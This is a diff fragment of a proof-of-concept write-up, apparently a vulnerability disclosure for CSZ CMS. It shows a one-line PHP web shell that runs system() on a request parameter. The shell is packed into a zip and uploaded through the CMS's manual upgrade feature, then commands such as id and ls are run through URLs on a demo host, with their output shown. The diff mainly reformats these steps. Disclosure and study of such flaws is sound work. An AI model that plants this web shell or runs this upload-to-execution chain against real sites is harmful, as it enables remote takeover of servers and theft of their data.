@@ -19,43 +19,47 @@
    <?php echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; ?>
    ```
 3. Go to System Upgrade Manually and upload the poc.zip file.
-4. Access poc.php via:
 
-    https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
-        Output:
-
-   uid=1000(soft) gid=1000(soft) groups=1000(soft)
-
-   https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
-
-    Output:
-
-      CHANGELOG
-      CONTRIBUTING.md
-      LICENSE.md
-      README.md
-      SECURITY.md
-      a.php
-      assets
-      cache.config.inc.php
-      config.inc.php
-      config_example.inc.php
-      corecss.css
-      corejs.js
-      cszcms
-      devtoolsbar.config.inc.php
-      env.config.inc.php
-      htaccess.config.inc.php
-      index.php
-      install
-      memcached.config.inc.php
-      nginx_example.com.conf
-      photo
-      poc.php
-      proxy.inc.php
-      redis.config.inc.php
-      system
-      templates
-      test.php
-      
-      
+4. Execute commands remotely:
+   - Test the execution with the `id` command:
+     ```
+     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
+     ```
+     Expected output:
+     ```
+     uid=1000(soft) gid=1000(soft) groups=1000(soft)
+     ```
+   - List directory contents using the `ls` command:
+     ```
+     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
+     ```
+     Expected output:
+     ```
+     CHANGELOG
+     CONTRIBUTING.md
+     LICENSE.md
+     README.md
+     SECURITY.md
+     a.php
+     assets
+     cache.config.inc.php
+     config.inc.php
+     config_example.inc.php
+     corecss.css
+     corejs.js
+     cszcms
+     devtoolsbar.config.inc.php
+     env.config.inc.php
+     htaccess.config.inc.php
+     index.php
+     install
+     memcached.config.inc.php
+     nginx_example.com.conf
+     photo
+     poc.php
+     proxy.inc.php
+     redis.config.inc.php
+     system
+     templates
+     test.php
+     ```
